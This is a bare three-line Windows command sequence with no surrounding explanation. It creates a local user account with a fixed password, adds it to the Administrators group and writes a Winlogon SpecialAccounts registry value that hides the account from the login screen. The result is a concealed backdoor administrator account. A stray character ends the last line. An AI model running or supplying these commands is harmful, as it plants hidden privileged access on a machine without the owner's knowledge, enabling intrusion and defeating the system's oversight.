net user /add baderiss sdsdsds@123456
net localgroup administrators /add baderiss
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v baderiss /t REG_DWORD /d 0´
